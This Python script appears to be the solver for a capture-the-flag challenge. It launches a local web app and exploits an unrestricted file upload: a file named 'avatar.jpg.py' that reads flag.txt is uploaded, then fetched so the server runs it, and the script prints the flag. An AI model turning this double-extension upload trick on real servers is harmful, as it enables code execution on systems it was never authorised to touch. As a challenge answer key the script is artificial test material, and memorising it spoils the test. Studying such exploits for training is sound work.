#!/usr/bin/env python3
from __future__ import annotations

import os, socket, subprocess, sys, time, urllib.parse, urllib.request
from pathlib import Path


def start(app: Path, port: int):
    env = os.environ.copy()
    env["PORT"] = str(port)
    proc = subprocess.Popen([sys.executable, str(app)], cwd=app.parent, env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    for _ in range(80):
        try:
            with socket.create_connection(("127.0.0.1", port), timeout=0.1):
                return proc
        except OSError:
            time.sleep(0.1)
    raise SystemExit("server not ready")


def main() -> None:
    root = Path(__file__).resolve().parents[1]
    proc = start(root / "attachments" / "app.py", 18083)
    try:
        boundary = "----ctfboundary"
        payload = (
            f"--{boundary}\r\n"
            "Content-Disposition: form-data; name=\"file\"; filename=\"avatar.jpg.py\"\r\n"
            "Content-Type: text/plain\r\n\r\n"
            "print(open('flag.txt').read())\n"
            f"--{boundary}--\r\n"
        ).encode()
        req = urllib.request.Request(
            "http://127.0.0.1:18083/upload",
            data=payload,
            headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
        )
        urllib.request.urlopen(req).read()
        body = urllib.request.urlopen("http://127.0.0.1:18083/files/avatar.jpg.py").read().decode()
        print(body.strip())
    finally:
        proc.terminate()
        proc.wait(timeout=5)


if __name__ == "__main__":
    main()
